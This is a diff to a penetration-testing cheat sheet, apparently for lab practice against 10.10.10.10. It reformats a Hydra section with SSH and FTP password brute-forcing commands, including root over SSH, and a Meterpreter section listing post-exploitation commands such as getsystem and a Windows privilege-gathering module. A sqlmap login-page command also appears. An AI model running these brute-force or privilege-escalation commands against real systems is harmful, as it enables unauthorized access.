@@ -77,7 +77,7 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D d
 ```
 
 ## Hydra
-**SSH Login Bruteforcing**\
+**SSH & FTP Login Bruteforcing**\
 ```sh
 hydra -L userslist -P passwordslist ftp://10.10.10.10
 hydra -l root -P passwordslist ssh://10.10.10.10 
@@ -148,12 +148,13 @@ cd /../.. >                #to Change remote working directory\
 ls /.. >                   #to List contents of remote directory
 ```
 ## Meterpreter
-ps\
-getuid\
-getpid\
-getsystem\
+```sh
+ps
+getuid
+getpid
+getsystem
 ps -U SYSTEM
-
+```
 **CHECK UAC/Privileges**\
 run post/windows/gather/win_privs
 
